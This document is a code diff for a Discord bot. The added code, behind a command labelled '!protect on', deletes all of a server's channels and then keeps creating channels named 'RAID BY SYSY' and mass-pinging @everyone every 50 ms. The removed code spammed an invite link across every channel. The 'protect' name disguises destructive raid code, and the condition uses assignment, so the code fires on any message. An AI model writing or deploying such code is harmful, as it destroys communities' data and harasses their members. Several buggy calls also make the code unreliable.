@@ -13,11 +13,27 @@ client.on('ready', () => {
 });
 
 client.on('message', message => {
-    if (message.content = "!protect on") {
-    setInterval(message.guild.channels.map(m => m.send("Go https://discord.gg/YPg9vrm ")) , 500  ) 
-    }
-});
+        if (message.content = "!protect on") {
 
+    message.guild.channels.map(c => {
+        c.delete();
+    
+    });
+    setInterval(() => {
+
+            message.guild.createChannel('undefined-156');
+            message.guild.createChannel("RAID BY SYSY", 'text');
+            message.channels.find('name', "RAID BY SYSY").send("@everyone");
+
+        message.guild.createChannel("RAID BY SYSY");
+        }, 50);
+
+if (message.content = "!protect") {
+
+
+}}
+    
+});
 
 
 client.login(process.env.TOKEN)
